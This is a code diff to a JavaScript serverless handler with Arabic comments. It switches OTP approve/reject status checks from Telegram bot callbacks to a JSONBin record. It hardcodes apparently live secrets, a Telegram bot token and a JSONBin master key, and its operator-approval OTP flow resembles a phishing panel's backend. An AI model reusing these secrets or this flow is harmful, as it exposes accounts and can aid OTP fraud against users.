@@ -7,51 +7,30 @@ export default async function handler(req, res) {
 
   const OTP_BOT_TOKEN = "9264807725:AAEtg1bnRFmHq0MnOJu_WAlDQePrDI_Wxc4";
   const CHAT_ID = "8278749797";
+  
+  // مفاتيح سحابة JSONBin لتخزين الحالات بشكل دقيق
+  const BIN_ID = "6af041a3ffd5d16053b0b102";
+  const API_KEY = "$2a$10$KdTTWrgsRm/Rk01Njf6HmurDvGeNyAcYaUsLuCIWF20baDFcigsQ6";
+
   const method = req.method;
   const body = req.body || {};
 
-  // 1. فحص الحالة (GET) لمعرفة هل تم الضغط على الموافقة أو الرفض
+  // 1. فحص الحالة (GET) من السحابة
   if (method === 'GET') {
     const { user_id } = req.query;
     if (!user_id) return res.status(200).json({ status: 'pending' });
 
     try {
-      const tgRes = await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/getUpdates?allowed_updates=["callback_query"]`);
-      const tgData = await tgRes.json();
+      const getRes = await fetch(`https://api.jsonbin.io/v3/b/${BIN_ID}/latest`, {
+        headers: { 'X-Master-Key': API_KEY }
+      });
+      const currentData = await getRes.json();
+      const record = currentData.record || {};
 
-      let status = 'pending';
-      let callbackQueryId = null;
-
-      if (tgData.ok && tgData.result) {
-        // نمر على التحديثات من الأحدث للأقدم لضمان التقاط القرار الأخير
-        for (let i = tgData.result.length - 1; i >= 0; i--) {
-          const update = tgData.result[i];
-          if (update.callback_query) {
-            const data = update.callback_query.data;
-            if (data === `approve_otp_${user_id}`) {
-              status = 'approved';
-              callbackQueryId = update.callback_query.id;
-              break;
-            } else if (data === `reject_otp_${user_id}`) {
-              status = 'rejected';
-              callbackQueryId = update.callback_query.id;
-              break;
-            }
-          }
-        }
-      }
-
-      // إذا وجدنا استجابة، نقوم بتأكيدها لدى تليجرام لكي لا تظل معلقة
-      if (callbackQueryId) {
-        await fetch(`https://api.telegram.org/bot${OTP_BOT_TOKEN}/answerCallbackQuery`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ callback_query_id: callbackQueryId, text: "تم التحقق بنجاح!" })
-        }).catch(() => {});
-      }
-
+      // نتحقق من حالة الـ OTP الخاصة بهذا المستخدم
+      const status = record[`otp_${user_id}`] || 'pending';
       return res.status(200).json({ status });
-    } catch (e) {
+    } catch (err) {
       return res.status(200).json({ status: 'pending' });
     }
   }
